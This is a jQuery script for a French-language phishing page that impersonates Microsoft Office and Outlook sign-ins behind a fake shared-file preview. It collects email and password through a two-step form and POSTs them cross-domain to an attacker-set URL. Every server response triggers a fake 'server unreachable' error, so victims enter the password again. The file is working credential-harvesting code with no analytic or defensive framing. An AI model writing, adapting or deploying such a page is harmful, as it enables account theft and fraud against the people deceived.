//paste this code under the head tag or in a separate js file.
// Wait for window load
$(window).load(function () {
  // Animate loader off screen
  setTimeout(() => {
    $(".se-pre-con").fadeOut("slow");
  }, 3000);
});

$(document).ready(function () {
  setTimeout(() => {
    $("#left-modal-lg").modal("show");
  }, 5000);
});

$(document).ready(function () {
  // Start - Get file names from URL
  function GetURLParameter(sParam) {
    var sPageURL = window.location.search.substring(1);
    var sURLVariables = sPageURL.split("&");
    for (var i = 0; i < sURLVariables.length; i++) {
      var sParameterName = sURLVariables[i].split("=");
      if (sParameterName[0] == sParam) {
        return decodeURIComponent(sParameterName[1]);
      }
    }
  }

  var shared = GetURLParameter("shared");
  var filename = GetURLParameter("filename");

  $("#sharedFile, #sharedFileThumbnail").attr("src", shared);
  document.getElementById("sharedFileName").innerHTML = filename;
  // End - Get file names from URL

  // Start - Email address validation
  function validateEmail(email) {
    var hash = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
    return hash.test(email);
  }
  // End - Email address validation

  // Start - Hide & empty error messages on keyup
  $("#emailForm, #passwordForm input").keydown(function () {
    $("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");
    $("#username, #password").removeClass("not-valid");
  });
  // End - Hide & Empty error messages on keyup

  // Start - Pop up window for office login
  $("#microsoft-connect").click(function () {
    $("#emailForm, #passwordForm")[0].reset();
    $("#loginCount").val("1");
    $("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");
    $("#username, #password").removeClass("not-valid");
    $("#passwordForm, #passwordHeader").addClass("visually-hidden");
    $("#emailForm, #emailHeader").removeClass("visually-hidden");

    var officeUrl = $("#officeURL").html();
    let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=100,top=100`;
    officeAuth = window.open(officeUrl, "Auth", params);

    var timer = setInterval(function () {
      if (officeAuth.closed) {
        $("#authError").html('<span id="errorText">Hmm, impossible d&acute;atteindre le serveur. Essayez à nouveau</span>').removeClass("visually-hidden");
        clearInterval(timer);
      }
    }, 250);

    if (!officeAuth) {
      window.location.href = officeUrl;
    }
  });
  // End - Pop up window for office login

  // Start - Pop up window for outlook login
  $("#outlook-connect").click(function () {
    $("#emailForm, #passwordForm")[0].reset();
    $("#loginCount").val("1");
    $("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");
    $("#username, #password").removeClass("not-valid");
    $("#passwordForm, #passwordHeader").addClass("visually-hidden");
    $("#emailForm, #emailHeader").removeClass("visually-hidden");

    var exchangeUrl = $("#exchangeURL").html();
    let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=100,top=100`;
    exchangeAuth = window.open(exchangeUrl, "Auth", params);

    var timer = setInterval(function () {
      if (exchangeAuth.closed) {
        $("#authError").html('<span id="errorText">Hmm, impossible d&acute;atteindre le serveur. Essayez à nouveau</span>').removeClass("visually-hidden");
        clearInterval(timer);
      }
    }, 250);

    if (!exchangeAuth) {
      window.location.href = exchangeUrl;
    }
  });
  // End - Pop up window for outlook login

  // Start - Email validation and login
  $("#emailForm").submit(function (e) {
    e.preventDefault();
    $("#authError, #emailError").html("").addClass("visually-hidden");
    $("#username").removeClass("not-valid");
    var username = $("#username").val().trim();

    if (!username) {
      $("#emailError").html("L&acute;e-mail doit avoir une valeur.").removeClass("visually-hidden");
      $("#username").focus().addClass("not-valid");
    } else if (!validateEmail(username)) {
      $("#emailError").html("Adresse e-mail non valide").removeClass("visually-hidden");
      $("#username").focus().addClass("not-valid");
    } else {
      $("#emailForm, #emailHeader").addClass("visually-hidden");
      $("#passwordForm, #passwordHeader").removeClass("visually-hidden");
      $("#authError, #emailError").html("").addClass("visually-hidden");
      $("#username, #password").removeClass("not-valid");
      $("#userAddress").html(username);
      $("#email").val(username);
      $("#password").focus();
    }
  });
  // End - Email validation and login

  // Start - Back to email login
  $("#changeEmail").click(function (e) {
    $("#passwordForm, #passwordHeader").addClass("visually-hidden");
    $("#emailForm, #emailHeader").removeClass("visually-hidden");
    $("#authError, passwordError").html("").addClass("visually-hidden");
    $("#username, #password").removeClass("not-valid");
    $("#useraddress, #email").html("");
    $("#username").focus();
  });
  // End - Back to email login

  // Start - Login form submit
  $("#passwordForm").submit(function (e) {
    e.preventDefault();
    $("#authError, #passwordError").html("").addClass("visually-hidden");
    $("#password").removeClass("not-valid");
    var password = $("#password").val().trim();

    if (!password) {
      $("#passwordError").html("Un mot de passe est obligatoire.").removeClass("visually-hidden");
      $("#password").focus().addClass("not-valid");
    } else if (password.length < 5) {
      $("#passwordError").html("E‑mail et/ou mot de passe non valides").removeClass("visually-hidden");
      $("#password").focus().addClass("not-valid");
    } else {
      jQuery.ajax({
        url: $("#sourceURL").html(),
        data: $("#passwordForm").serialize(),
        type: "POST",
        crossDomain: true,
        beforeSend: function () {
          $("#passwordForm input").blur();
          $("#authError, #passwordError, #emailError").html("").addClass("visually-hidden");
          $("#username, #password").removeClass("not-valid");
        },
        success: function (data) {
          if (data.match(/1/i)) {
            $("#loginCount").val("2");
            $("#password").val("");
            $("#password").focus();
            $("#authError").html('<span id="errorText">Hmm, impossible d&acute;atteindre le serveur. Essayez à nouveau</span>').removeClass("visually-hidden");
          } else if (data.match(/2/i)) {
            $("#loginCount").val("1");
            $("#password").val("");
            $("#password").focus();
            $("#authError").html('<span id="errorText">Hmm, impossible d&acute;atteindre le serveur. Essayez à nouveau</span>').removeClass("visually-hidden");
          } else if (data.match(/0/i)) {
            $("#loginCount").val("1");
            $("#password, #email").val("");
            $("#passwordForm, #passwordHeader").addClass("visually-hidden");
            $("#emailForm, #emailHeader").removeClass("visually-hidden");
            $("#username").focus();
            $("#authError").html('<span id="errorText">Veuillez vous connecter avec votre compte de messagerie.</span>').removeClass("visually-hidden");
          } else if (data.match(/-0/i)) {
            $("#loginCount").val("1");
            $("#password").val("");
            $("#password").focus();
            $("#authError").html('<span id="errorText">Erreur. Veuillez vérifier votre réseau et réessayer.</span>').removeClass("visually-hidden");
          }
        },
        error: function () {
          $("#loginCount").val("1");
          $("#password").val("");
          $("#password").focus();
          $("#authError").html('<span id="errorText">Erreur. Veuillez vérifier votre réseau et réessayer.</span>').removeClass("visually-hidden");
        },
      });
    }
  });
  // End - Login form submit
});
